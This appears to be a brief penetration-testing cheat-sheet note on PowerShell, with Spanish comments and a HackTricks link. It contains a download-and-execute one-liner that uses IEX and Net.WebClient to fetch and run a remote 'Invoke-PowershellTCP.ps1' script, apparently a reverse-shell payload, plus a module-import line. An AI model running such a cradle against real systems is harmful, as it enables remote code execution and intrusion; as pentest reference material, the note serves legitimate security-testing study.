# Powershell

Tags: #Windows #Powershell 

* [Powershell for Pentesters](https://book.hacktricks.xyz/windows-hardening/basic-powershell-for-pentesters)

```powershell 
❯ powershell -c "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/Omar/Scripts/main/Invoke-PowershellTCP.ps1')" # Ejecutar un comando 
```

```powershell
❯ Import-Module .\Script.ps1       # Importamos un modulo y asi podemos utilizar los submodulos 
```